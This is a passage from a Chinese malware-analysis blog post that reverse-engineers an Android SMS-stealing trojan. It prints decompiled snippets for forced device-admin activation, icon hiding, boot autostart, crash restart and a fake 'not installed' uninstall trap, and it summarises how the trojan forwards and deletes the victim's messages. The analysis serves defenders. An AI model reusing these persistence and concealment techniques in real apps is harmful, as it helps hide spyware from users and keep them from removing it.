<p><pre class="lang:java decode:true ">SMSutils.a(context, this);<br>SMSutils.a(context);</pre><br>这是onReceiver()方法里的函数，现在知道SMSReceiver接收到</p>
<p>&quot;android.provider.Telephony.SMS_RECEIVED&quot;广播的时候会调用beforesend()方法就行了</p>
<p>回溯，给这个方法改个名，叫InitSMSReceiver</p>
<p><img src="Image/30.png" alt=""></p>
<p>继续回溯，到主Activity“L”</p>
<p>又一个混淆</p>
<p><pre class="lang:java decode:true ">SMSutils.a(((Context)this));</pre><br>跟过去顺便修改一下变量</p>
<p><pre class="lang:java decode:true ">public static void a(Context context) {<br>        SMSutils.ptintLog(context, &quot;chkFirstRun&quot;);<br>        if(!SMSutils.bool_b) {<br>            Bootini.a(context);<br>            SMSutils.bool_b = true;<br>        }<br>}</pre><br>看log应该是检测是否是第一次运行，如果第一次运行那么if条件为真</p>
<p><pre class="lang:java decode:true ">Bootini.a(context);</pre><br>跟过去看看，顺便修改一下变量</p>
<p><img src="Image/31.png" alt=""></p>
<p>可以看出来这是第一次运行时执行的代码段，因为sharedpreferences是存在本地的</p>
<p>如果作者手机号写进去一次也就是说明已经运行过了，所以修改方法名字为firstrun()</p>
<p>回溯，修改该层方法名为checkfirstrun</p>
<p><img src="Image/32.png" alt=""></p>
<p>继续回溯</p>
<p>修改L最开始两个私有变量</p>
<p>获取设备管理接收者</p>
<p><pre class="lang:java decode:true ">this.devicepolicymanager = this.getSystemService(&quot;device_policy&quot;);</pre><br>用于获取管理员权限</p>
<p><pre class="lang:java decode:true ">this.componentname = new ComponentName(((Context)this), LR.class);</pre><br>跟进LR，猜测是获取管理员权限的</p>
<p><img src="Image/33.png" alt=""></p>
<p>继续看代码</p>
<p>判断是否已经获得管理员权限，如果已经获得过则只是调试会有日志输出</p>
<p><pre class="lang:java decode:true ">if(this.devicepolicymanager.isAdminActive(this.component)) {<br>    SMSutils.ptintLog(((Context)this), &quot;已经注册设备管理器&quot;);  // 用于调试的日志输出<br>}</pre><br>如果没有获得会使用隐式意图弹出界面让受害者激活</p>
<p><pre class="lang:java decode:true ">else {<br>    Intent intent = new Intent(&quot;android.app.action.ADD_DEVICE_ADMIN&quot;);<br>    intent.putExtra(&quot;android.app.extra.DEVICE_ADMIN&quot;, this.component);<br>    intent.putExtra(&quot;android.app.extra.ADD_EXPLANATION&quot;, &quot;设备管理器&quot;);<br>    this.startActivity(intent);<br>    SMSutils.ptintLog(((Context)this), &quot;注册设备管理器&quot;);  // 用于调试的日志输出<br>}</pre><br>如果你不是很明白隐式意图激活的话我这里创建了个demo来演示，它会自己弹出来让受害者激活，不是自己后台自动激活，而且激活后需要去掉激活才能卸载</p>
<p><img src="Image/34.png" alt=""></p>
<p>如果系统版本号小于14就隐藏图标</p>
<p><pre class="lang:java decode:true ">if(Build$VERSION.SDK_INT &lt; 14)<br>{<br>    this.getPackageManager().setComponentEnabledSetting(this.getComponentName(), 2, 1);<br>}</pre><br>将当前activity移出栈，但不调用onDestroy()，所以应用还是在后台运行</p>
<p><pre class="lang:java decode:true ">this.finish();</pre><br>一个延迟5s的任务a</p>
<p><pre class="lang:java decode:true ">Handler handler = new Handler();<br>handler.postDelayed(new a(this, handler), 5000);</pre><br>双击跟过去</p>
<p><pre class="lang:java decode:true ">package com.sonyericsson.androidapp.microblogci8dmdo4;</p>
<p>import android.content.Intent;<br>import android.os.Handler;</p>
<p>class a implements Runnable {<br>    a(L arg1, Handler arg2) {<br>        this.a = arg1;<br>        this.b = arg2;<br>        super();<br>    }</p>
<pre><code>public void run() {
    this.b.removeCallbacks(((Runnable)this));
    Intent v0 = new Intent();
    v0.setType(&quot;image/*&quot;);
    v0.setAction(&quot;android.intent.action.GET_CONTENT&quot;);
    this.a.startActivity(v0);
}
</code></pre><p>}</pre><br>即使有一些变量名怪怪的但是很明显看出来这是打开图片管理器</p>
<p>不管怎么样，变量名还是要改的，类名也要改</p>
<p><img src="Image/35.png" alt=""></p>
<p>同样我写了个demo演示这段代码的效果</p>
<p><img src="Image/36.png" alt=""></p>
<p>有意思吧</p>
<p>然后代码到这里就没了，选择图片后是要干什么？？？！！！</p>
<p>Excuse me？？？！！！</p>
<p>没了就没了吧，记得刚才我们没分析的两个混淆的方法吗?</p>
<pre><code>if(!&quot;android.provider.Telephony.SMS_RECEIVED&quot;.equals(intent.getAction())) {
    SMSutils.InitSMSReceiver(context, this);
    SMSutils.checkfirstrun(context);
}
</code></pre><p>刚才没分析，现在是不是一下子明白了</p>
<p><img src="Image/37.png" alt=""></p>
<p>当接收到的广播不是<code>&quot;android.provider.Telephony.SMS_RECEIVED&quot;</code>而是</p>
<p><code>&quot;android.intent.action.BOOT_COMPLETED&quot;</code>的时候，就执行初始化，也就是说，这地方是开机自启动啊！！！！！！</p>
<p>有点意思啊</p>
<p>来看看其它没有分析的类</p>
<p>APP</p>
<pre><code>package com.sonyericsson.androidapp.microblogci8dmdo4;

import android.app.Application;
import android.os.Process;

public class App extends Application implements Thread$UncaughtExceptionHandler {
    public App() {
        super();
    }

    public void onCreate() {
        super.onCreate();
        Thread.setDefaultUncaughtExceptionHandler(((Thread$UncaughtExceptionHandler)this));  
    }

    public void uncaughtException(Thread arg2, Throwable arg3) {
        Process.killProcess(Process.myPid());  
    }
}
</code></pre><p>这是用于不同型号手机导致的应用崩溃的自动重启常用方法，从名字也可以看出来，没有捕获异常却崩溃了</p>
<p>关键还是这句<code>Process.killProcess(Process.myPid())</code>，这句很有意思的，ActivityManager一直监听者进程状态，如果发现进程被kill，会立即重启进行，并重启之前状态对应的Activity、Service、ContentProvider等</p>
<p>然后还有一个没有分析的是类U</p>
<pre><code>package com.sonyericsson.androidapp.microblogci8dmdo4;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.widget.Toast;

public class U extends Activity {
    public U() {
        super();
    }

    protected void onCreate(Bundle arg3) {
        super.onCreate(arg3);
        SMSutils.InitSMSReceiver(((Context)this), new SMSReceiver());
        Toast.makeText(((Context)this), &quot;应用程序尚未安装在您的手机上&quot;, 1).show();
        this.finish();
    }
}
</code></pre><p>其它地方没有调用到，看代码可能是卸载相关，看Manifest文件</p>
<p><img src="Image/38.png" alt=""></p>
<p>为了简单易懂于是我又写了个demo来演示一下具体过程</p>
<p><img src="Image/39.png" alt=""></p>
<p>可以看到卸载的时候出现了选择，我们来选择应用”卸载程序“，并且<code>just once</code>，不然默认了以后就尴尬了</p>
<p><img src="Image/40.png" alt=""></p>
<p>可以看到执行了类U的<code>onCreate()</code>方法，，因为我把<code>finish()</code>方法注释掉了，所以界面是空白的，把<code>finish()</code>注释去掉</p>
<p>看一下后台运行的程序，果然还在运行，并没有卸载也没有退出，如果系统版本小于14，隐藏了图标那还真是不容易看出来</p>
<p><img src="Image/41.png" alt=""></p>
<p>接着我们用系统的应用管理器来卸载，在卸载时选择第一个</p>
<p>然后会要求取消激活管理员权限</p>
<p><img src="Image/42.png" alt=""></p>
<p>那就取消激活，把钩钩去掉</p>
<p><img src="Image/43.png" alt=""></p>
<p>选择<code>Deactivate</code></p>
<p><img src="Image/44.png" alt=""></p>
<p>然后就可以用系统自带的管理器正常卸载了，卸载后可以看到intent进程已经不见了</p>
<p><img src="Image/45.png" alt=""></p>
<p>总结一下行为：第一次要受害者激活设备管理器，然后会发送所有的短信给作者，并且把受害者的短信会话删除，然后延迟五秒弹出相册管理器，不知道要干什么，看代码里分分钟要锁屏结果半毛钱的锁屏行为都没看到，然后监控短信，作者可以利用受害者手机发送短信，可以开机自启动，最后因为激活了设备管理器，所以常规的卸载不行，再者系统版本号小于14的话会隐藏图标，对于安全意识不高的同学还是比较有危害的</p>
<p>常规卸载的话不行</p>
<p><img src="Image/46.png" alt=""></p>
<p>用第三方应用管理卸载会出现选择，不同的选择出现的情况参考前面所说的</p>
<p><img src="Image/47.png" alt=""></p>
<p>最后，墙裂吐槽，作者敢不敢走点心，这种图标，这种名字......</p>
<p>Excuse me？？？</p>
<p>冲你这写恶意软件的态度我给差评！！！！！！</p>
<p>没有星！！！！！！</p>
<p>态度相当不好！！！！！！</p>
<p><img src="Image/48.png" alt=""></p>
<p>结尾彩蛋，文中一些安卓的知识：<br>这个在锁屏软件或者勒索软件里面常用：<a href="http://blog.csdn.net/dyllove98/article/details/9771541">关于DevicePolicyManager申请系统管理权限</a><br>锁屏知识：<a href="http://blog.csdn.net/huronzhu/article/details/8580243">Android 锁屏（设备管理）</a><br>L里面的隐式意图，用于激活设备管理权限，一条龙服务就等你激活：<a href="http://my.oschina.net/u/1246663/blog/197468">Android隐式意图打开Activity</a><br>显示意图和隐式意图：<a href="http://blog.csdn.net/loongggdroid/article/details/17887975">Android学习记录（7）—Intent中显示意图和隐式意图的用法</a><br>锁屏的知识：<a href="http://www.xuanyusong.com/archives/1638">Android研究院之应用程序屏幕锁定详解（二十三）</a><br>L最后延迟5s然后打开图片管理器：<a href="http://blog.csdn.net/a734797702/article/details/7634267">关于 android 中 postDelayed方法的讲解</a><br>意图Action，这个重要，跟Manifest结合：<a href="http://www.cnblogs.com/hanyonglu/archive/2012/03/26/2417278.html">Android开发之Intent.Action</a><br>锁屏代码实现：<a href="http://www.cnblogs.com/lee0oo0/archive/2012/12/13/2817021.html">android一键锁屏代码</a><br>异常：<a href="http://www.2cto.com/kf/201207/138305.html">Android 应用设置全局Exception处理事件的方法</a><br>和获得设备管理权限一起用：<a href="http://blog.csdn.net/jaycee110905/article/details/8643124">Android ComponentName的用法</a><br>文中用于崩溃重启的办法：<a href="http://blog.sina.com.cn/s/blog_3e28c8a50101gxyo.html">android开发两种退出程序方式(killProcess,System.exit)</a><br>读通话记录和短信的方法：<a href="http://www.2cto.com/kf/201402/282150.html">Android下如何获得通话记录和短信记录</a><br>获取通讯录信息的方法：<a href="http://www.2cto.com/kf/201403/283805.html">Android开发学习之电话、短信、联系人</a><br>文中监控短信的办法：<a href="http://www.mobile-open.com/2015/76791.html">Android_通过ContentObserver监听短信数据变化</a><br>ContentObserver监控数据：<a href="http://www.ithtw.com/624.html">android 使用ContentObserver监听数据库内容变化(短信、联系人变动)</a><br>ContentObserver监控数据：<a href="http://blog.csdn.net/laichao1112/article/details/6436511">使用ContentObserver监听短信</a><br>ContentObserver监控数据：<a href="http://blog.csdn.net/linmiansheng/article/details/21043047?utm_source=tuicool&amp;utm_medium=referral">Android学习小Demo（13）Android中关于ContentObserver的使用</a><br>ContentObserver监控数据：<a href="http://blog.csdn.net/qinjuning/article/details/7047607">Android中内容观察者的使用---- ContentObserver类详解</a><br>有一个类里面多个重名函数，但是参数不一样，这就是重载：<a href="http://android.blog.51cto.com/268543/53181/">Java重载,重写以及继承,多态的区别</a></p>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
